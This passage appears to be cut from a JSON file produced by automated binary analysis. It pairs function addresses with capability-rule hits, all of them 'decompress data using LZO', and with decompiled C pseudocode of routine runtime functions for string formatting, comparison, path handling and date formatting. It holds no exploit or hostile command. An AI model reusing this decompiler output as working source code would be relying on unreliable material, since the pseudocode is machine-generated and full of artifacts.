        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409db4(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cStack8;\n    \n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cStack8 = ROUND(fVar6);\n        uVar2 = cStack8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cStack8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 422
    },
    "00409ff0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00409ff0(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_1h;\n    \n    if (-1 < in_EDX) {\n        var_ch = in_EDX + 1;\n        do {\n            iVar2 = *(arg_8h + -4);\n            iVar3 = *in_EAX;\n            if (iVar2 != 0) {\n                iVar2 = *(iVar2 + -4);\n            }\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar1 = fcn.004059dc(iVar3);\n            fcn.004059dc(iVar2, uVar1);\n            iVar2 = sub.kernel32.dll_CompareStringA_1();\n            if (iVar2 == 2) {\n                return 1;\n            }\n            in_EAX = in_EAX + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    return 0;\n}\n",
        "token_count": 296
    },
    "0040a2a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a2a4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    char cVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x40a2b9;\n    fcn.004059cc();\n    uStack32 = 0x40a38d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    if (in_EAX == 0) {\n        puStack28 = &stack0xfffffffc;\n        iVar1 = fcn.0040dba8();\n        *(iVar1 + 0xc) = 3;\n        fcn.00404ec4();\n    }\n    fcn.0040e86c();\n    fcn.004055c8();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (in_EAX < 3) {\n        cVar2 = '\\x01';\n    }\n    else {\n        cVar2 = '\\0';\n        fcn.0040a280();\n    }\n    cVar2 = cVar2 == '\\0';\n    if (cVar2) {\n        fcn.0040a590();\n        fcn.00405974();\n    }\n    else {\n        cVar2 = '\\x01';\n    }\n    if (cVar2 == '\\0') {\n        fcn.0040a590();\n        cVar2 = fcn.0040a2a4();\n        if (cVar2 != '\\0') {\n            fcn.0040a83c();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40a394;\n    uStack32 = 0x40a38c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 463
    },
    "0040a508": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040a508(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\n    while (cVar1 = fcn.0040e4f4(),  cVar1 == '\\x02') {\n        iVar2 = iVar2 + -1;\n    }\n    return in_EAX + -1 + iVar2;\n}\n",
        "token_count": 138
    },
    "0040a53c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a53c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = param_2;\n    if (param_2 != 0) {\n        iVar3 = *(param_2 + -4);\n    }\n    fcn.004059dc();\n    do {\n        if (iVar3 < 1) {\n            return iVar3;\n        }\n        if ((*(param_2 + -1 + iVar3) != '\\0') && (iVar2 = fcn.0040aa30(),  iVar2 != 0)) {\n            cVar1 = fcn.0040e4f4();\n            if (cVar1 != '\\x02') {\n                return iVar3;\n            }\n            iVar3 = iVar3 + -1;\n        }\n        iVar3 = iVar3 + -1;\n    } while( true );\n}\n",
        "token_count": 211
    },
    "0040a5c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a5c4(uint param_1, uint param_2)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    pcVar1 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar1 = *(in_EAX + -4);\n    }\n    if (pcVar1 < 2) {\n        bVar5 = false;\n    }\n    else {\n        bVar5 = in_EAX[1] == ':';\n    }\n    if (bVar5) {\n        fcn.00405a44(param_2);\n    }\n    else {\n        pcVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            pcVar1 = *(in_EAX + -4);\n        }\n        if (pcVar1 < 2) {\n            bVar5 = false;\n        }\n        else {\n            bVar5 = *in_EAX == '\\\\';\n        }\n        if (bVar5) {\n            bVar5 = in_EAX[1] == '\\\\';\n        }\n        else {\n            bVar5 = false;\n        }\n        if (bVar5) {\n            iVar3 = 0;\n            iVar4 = 3;\n            while ((iVar2 = fcn.0040580c(),  iVar4 < iVar2 && (iVar3 < 2))) {\n                if (in_EAX[iVar4 + -1] == '\\\\') {\n                    iVar3 = iVar3 + 1;\n                }\n                if (iVar3 < 2) {\n                    iVar4 = iVar4 + 1;\n                }\n            }\n            fcn.00405a44(param_2);\n        }\n        else {\n            fcn.00405530();\n        }\n    }\n    return;\n}\n",
        "token_count": 407
    },
    "0040a918": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a918(void)\n\n{\n    fcn.004059dc();\n    fcn.0040a8e4();\n    return;\n}\n",
        "token_count": 35
    },
    "0040a960": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a960(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    param_2 = param_2 - in_EAX;\n    if (param_2 == 0) {\n        return 0;\n    }\n    while( true ) {\n        uVar1 = in_EAX[param_2];\n        uVar3 = uVar1;\n        puVar2 = in_EAX;\n        if ((uVar1 != *in_EAX) || (uVar1 == 0)) break;\n        uVar1 = in_EAX[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[1]) || (uVar1 == 0)) goto code_r0x0040a9e2;\n        uVar1 = in_EAX[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[2]) || (uVar1 == 0)) goto code_r0x0040a9df;\n        uVar1 = in_EAX[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[3]) goto code_r0x0040a9dc;\n        puVar2 = in_EAX + 4;\n        if (uVar1 == 0) goto code_r0x0040a9d9;\n        uVar1 = puVar2[param_2];\n        uVar3 = uVar1;\n        if ((uVar1 != *puVar2) || (uVar1 == 0)) break;\n        uVar1 = puVar2[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[5]) || (uVar1 == 0)) goto code_r0x0040a9e2;\n        uVar1 = puVar2[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[6]) || (uVar1 == 0)) goto code_r0x0040a9df;\n        uVar1 = puVar2[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[7]) goto code_r0x0040a9dc;\n        in_EAX = in_EAX + 8;\n        puVar2 = in_EAX;\n        if (uVar1 == 0) goto code_r0x0040a9d9;\n    }\ncode_r0x0040a9e5:\n    return *puVar2 - uVar3;\ncode_r0x0040a9d9:\n    puVar2 = puVar2 + -4;\ncode_r0x0040a9dc:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a9df:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a9e2:\n    puVar2 = puVar2 + 1;\n    goto code_r0x0040a9e5;\n}\n",
        "token_count": 726
    },
    "0040aac0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040aac0(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -4) + -4;\n}\n",
        "token_count": 38
    },
    "0040aaf8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040aaf8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00402f1c();\n    }\n    return;\n}\n",
        "token_count": 49
    },
    "0040af9c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040af9c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t arg_10h;\n    uint var_100ch;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EDX;\n    if (in_EDX != 0) {\n        iVar1 = *(in_EDX + -4);\n    }\n    if (iVar1 < 0xc00) {\n        iVar1 = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n        }\n        var_ch = fcn.0040ab90(arg_8h, in_ECX, iVar1);\n        iVar1 = 0x1000;\n    }\n    else {\n        iVar1 = in_EDX;\n        var_ch = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n            var_ch = iVar1;\n        }\n    }\n    if (var_ch < iVar1 + -1) {\n        fcn.00405620();\n    }\n    else {\n        while (iVar1 + -1 <= var_ch) {\n            iVar1 = iVar1 * 2;\n            fcn.00405530();\n            fcn.00405c6c();\n            arg_10h = in_EDX;\n            if (in_EDX != 0) {\n                arg_10h = *(in_EDX + -4);\n            }\n            var_ch = fcn.0040ab90(arg_8h, in_ECX, arg_10h);\n        }\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 391
    },
    "0040bd90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd90(uint arg_8h)\n\n{\n    fcn.0040bd4c(arg_8h);\n    return;\n}\n",
        "token_count": 36
    },
    "0040be9c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040be9c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY336;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack300 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack304 = 0x40bffe;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    fcn.00405530();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    fcn.004055c8();\n    uVar1 = fcn.004059dc(&fcn.0040be9c::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040be9c::var_14h, uVar1);\n    uStackY336 = 0x40bf1f;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        uStackY336 = 0x40bf39;\n        fcn.004057a0();\n        if (in_EAX == 1) {\n            if (*0x4958cc == 4) {\n                if (*0x4958d0 == 1) {\n                    uStackY336 = 0x40bf99;\n                    iVar2 = fcn.0040e530();\n                    if (iVar2 == 4) {\n                        fcn.0040e64c();\n                        fcn.00405728();\n                        fcn.0040e6d0();\n                        uStackY336 = 0x40bfdd;\n                        fcn.00405620();\n                    }\n                }\n            }\n            else if (*0x4958cc == 0x11) {\n                fcn.0040e6d0();\n                fcn.00405a44();\n                uStackY336 = in_EDX;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStackY336;\n    fcn.00405530(0x40c005);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 613
    },
    "0040c018": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c018(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char **in_EDX;\n    uint *in_FS_OFFSET;\n    char **ppcStackY332;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack300 = 0x40c106;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    fcn.00405530();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    if (in_EAX < 3) {\n        fcn.004055c8();\n    }\n    else {\n        fcn.004055c8();\n    }\n    uVar1 = fcn.004059dc(&fcn.0040c018::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040c018::var_14h, uVar1);\n    ppcStackY332 = 0x40c0a9;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        ppcStackY332 = 0x40c0bf;\n        fcn.004057a0();\n        if ((in_EAX == 1) && (**in_EDX == '0')) {\n            fcn.00405a44();\n            ppcStackY332 = in_EDX;\n        }\n    }\n    *in_FS_OFFSET = ppcStackY332;\n    fcn.00405530(0x40c10d);\n    return;\n}\n",
        "token_count": 494
    },
    "0040c9fc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c9fc(int32_t param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar var_9h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x40cac2;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = 0;\n    puVar1 = &stack0xfffffffc;\n    var_8h = param_2;\n    if (param_1 != 0) {\n        fcn.0040c944();\n        fcn.00405a44(&var_14h);\n        var_10h = var_14h;\n        iVar3 = param_1;\n        if (param_1 != 0) {\n            iVar3 = *(param_1 + -4);\n        }\n        iVar4 = var_14h;\n        if (var_14h != 0) {\n            iVar4 = *(var_14h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar4);\n        uVar2 = fcn.004059dc(iVar3, uVar2);\n        in_stack_ffffffb4 = 0x400;\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        puVar1 = puStack40;\n        if (iVar3 == 2) {\n            if (param_1 != 0) {\n                param_1 = *(param_1 + -4);\n            }\n            *var_8h = *var_8h + param_1;\n            var_9h = 1;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.00405530(0x40cac9);\n    return;\n}\n",
        "token_count": 518
    },
    "0040cad4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040cad4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char cStack16;\n    \n    uVar2 = 0;\n    fcn.0040c944();\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if ((*param_2 <= iVar1) && (cStack16 = param_1,  *(in_EAX + -1 + *param_2) == cStack16)) {\n        *param_2 = *param_2 + 1;\n        uVar2 = 1;\n    }\n    return CONCAT44(param_1, uVar2);\n}\n",
        "token_count": 180
    },
    "0040d198": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040d198(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040cc54();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 133
    },
    "0040d1d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040d1d0(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040cfa0();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 136
    },
    "0040d23c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d23c(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    double dStack28;\n    \n    uVar3 = 1;\n    cVar1 = fcn.0040cc54();\n    if (cVar1 == '\\0') {\n        uVar2 = 1;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        if (in_EAX < 1) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = fcn.0040cfa0();\n        }\n        uVar2 = uVar2 ^ 1;\n    }\n    if (uVar2 == 0) {\n        if (dStack28 < *0x40d2d4) {\n            *param_2 = dStack28 - 0.0;\n        }\n        else {\n            *param_2 = dStack28 + 0.0;\n        }\n    }\n    else {\n        uVar3 = fcn.0040d1d0();\n    }\n    return uVar3;\n}\n",
        "token_count": 278
    },
    "0040d660": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040d660(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack44 = 0x40d830;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar5 = 1;\n    fcn.00405530();\n    arg_8h = &fcn.0040d660::var_8h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d324(arg_8h);\n    iVar3 = fcn.00409f08();\n    if (iVar3 - 3U < 3) {\n        while (iVar3 = fcn.0040580c(),  iVar5 <= iVar3) {\n            uVar4 = *(in_EAX + -1 + iVar5);\n            if ((*((uVar4 >> 3) + 0x48f828) >> (uVar4 & 7) & 1) == 0) {\n                iVar3 = fcn.0040a9ec();\n                if (iVar3 == 0) {\n                    fcn.00405818();\n                    iVar5 = iVar5 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040a9ec();\n                    if (iVar3 == 0) {\n                        fcn.00405818();\n                        iVar5 = iVar5 + 3;\n                    }\n                    else {\n                        iVar3 = fcn.0040a9ec();\n                        if (iVar3 == 0) {\n                            fcn.00405818();\n                            iVar5 = iVar5 + 1;\n                        }\n                        else {\n                            cVar1 = *(in_EAX + -1 + iVar5);\n                            if ((cVar1 == 'Y') || (cVar1 == 'y')) {\n                                fcn.00405818();\n                            }\n                            else {\n                                fcn.00405718();\n                                fcn.00405818();\n                            }\n                        }\n                    }\n                }\n                iVar5 = iVar5 + 1;\n            }\n            else {\n                var_4h = fcn.0040e768();\n                arg_8h = &fcn.0040d660::var_10h;\n                fcn.00405a44();\n                fcn.00405818();\n                iVar5 = iVar5 + var_4h;\n            }\n        }\n    }\n    else {\n        if ((*0x4958cc == 4) || (*0x4958cc - 0x11U < 2)) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        if (bVar2) {\n            for (; iVar3 = fcn.0040580c(),  iVar5 <= iVar3; iVar5 = iVar5 + 1) {\n                cVar1 = *(in_EAX + -1 + iVar5);\n                if ((cVar1 != 'G') && (cVar1 != 'g')) {\n                    fcn.00405718();\n                    fcn.00405818();\n                }\n            }\n        }\n        else {\n            fcn.00405584();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack44 = 0x40d837;\n    iStack48 = 0x40d82f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 875
    },
    "0040e530": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040e530(void)\n\n{\n    fcn.0040e554();\n    return;\n}\n",
        "token_count": 25
    },
    "0040e554": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e554(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar4 = in_EAX;\n        if (in_EAX != 0) {\n            iVar4 = *(in_EAX + -4);\n        }\n        bVar1 = iVar4 < param_2;\n    }\n    iVar4 = 0;\n    if ((!bVar1) && (iVar4 = param_2,  *0x4958d4 != '\\0')) {\n        iVar3 = 1;\n        iVar4 = 0;\n        if (0 < param_2) {\n            do {\n                uVar2 = *(in_EAX + -1 + iVar3);\n                if ((*((uVar2 >> 3) + 0x48f828) >> (uVar2 & 7) & 1) == 0) {\n                    iVar3 = iVar3 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040e7a0();\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar3 <= param_2);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 311
    },
    "0040e5bc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e5bc(int32_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    iVar4 = 1;\n    iVar3 = 1;\n    while ((iVar3 < iVar1 && (iVar4 < in_EDX))) {\n        iVar4 = iVar4 + 1;\n        uVar2 = *(in_EAX + -1 + iVar3);\n        if ((*((uVar2 >> 3) + 0x48f828) >> (uVar2 & 7) & 1) == 0) {\n            iVar3 = iVar3 + 1;\n        }\n        else {\n            iVar3 = fcn.0040e7a0();\n        }\n    }\n    if (((iVar4 == in_EDX) && (iVar3 < iVar1)) &&\n       (uVar2 = *(in_EAX + -1 + iVar3),  (*((uVar2 >> 3) + 0x48f828) >> (uVar2 & 7) & 1) != 0)) {\n        iVar3 = fcn.0040e7a0();\n        iVar3 = iVar3 + -1;\n    }\n    *in_ECX = iVar4;\n    *arg_8h = iVar3;\n    return;\n}\n",
        "token_count": 377
    },
    "0040e64c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e64c(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *in_stack_ffffffe8;\n    int32_t *piVar3;\n    int32_t aiStack20 [2];\n    \n    piVar3 = aiStack20;\n    aiStack20[0] = 0;\n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar2 = in_EAX;\n        if (in_EAX != 0) {\n            iVar2 = *(in_EAX + -4);\n        }\n        bVar1 = iVar2 < param_2;\n    }\n    iVar2 = aiStack20[0];\n    if (((!bVar1) && (iVar2 = param_2,  1 < param_2)) && (iVar2 = param_2,  *0x4958d4 != '\\0')) {\n        fcn.0040e5bc(aiStack20);\n        if (aiStack20[0] < param_2 + -1) {\n            bVar1 = true;\n        }\n        else {\n            if (in_EAX != 0) {\n                in_EAX = *(in_EAX + -4);\n            }\n            bVar1 = in_EAX <= piVar3;\n        }\n        iVar2 = aiStack20[0];\n        if (bVar1) {\n            in_stack_ffffffe8 = NULL;\n        }\n        else {\n            in_stack_ffffffe8 = piVar3 + 1;\n        }\n    }\n    aiStack20[0] = iVar2;\n    return CONCAT44(aiStack20[0], in_stack_ffffffe8);\n}\n",
        "token_count": 388
    },
    "0040e6d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e6d0(uint param_1, uchar *param_2)\n\n{\n    uchar *in_EAX;\n    uchar *puVar1;\n    uchar *puVar2;\n    uchar *in_stack_ffffffec;\n    uchar **ppuVar3;\n    uchar *apuStack16 [2];\n    \n    ppuVar3 = apuStack16;\n    apuStack16[0] = NULL;\n    puVar1 = apuStack16[0];\n    if (0 < param_2) {\n        puVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            puVar1 = *(in_EAX + -4);\n        }\n        if ((puVar1 < param_2) && (param_2 = in_EAX,  in_EAX != NULL)) {\n            param_2 = *(in_EAX + -4);\n        }\n        puVar1 = param_2;\n        if (*0x4958d4 != '\\0') {\n            fcn.0040e5bc(apuStack16);\n            puVar2 = in_EAX;\n            if (in_EAX != NULL) {\n                puVar2 = *(in_EAX + -4);\n            }\n            in_stack_ffffffec = ppuVar3;\n            puVar1 = apuStack16[0];\n            if ((puVar2 < ppuVar3) && (in_stack_ffffffec = in_EAX,  in_EAX != NULL)) {\n                in_stack_ffffffec = *(in_EAX + -4);\n            }\n        }\n    }\n    apuStack16[0] = puVar1;\n    return CONCAT44(apuStack16[0], in_stack_ffffffec);\n}\n",
        "token_count": 375
    },
    "0040e7d8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e7d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (param_2 < 1) {\n        bVar3 = false;\n    }\n    else {\n        iVar1 = in_EAX;\n        if (in_EAX != 0) {\n            iVar1 = *(in_EAX + -4);\n        }\n        bVar3 = param_2 <= iVar1;\n    }\n    if (bVar3) {\n        bVar3 = *(in_EAX + -1 + param_2) == '\\\\';\n    }\n    else {\n        bVar3 = false;\n    }\n    if (bVar3) {\n        uVar2 = fcn.0040e4f4();\n        return uVar2 & 0xffffff00 | uVar2 == '\\0';\n    }\n    return 0;\n}\n",
        "token_count": 219
    },
    "0040e820": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
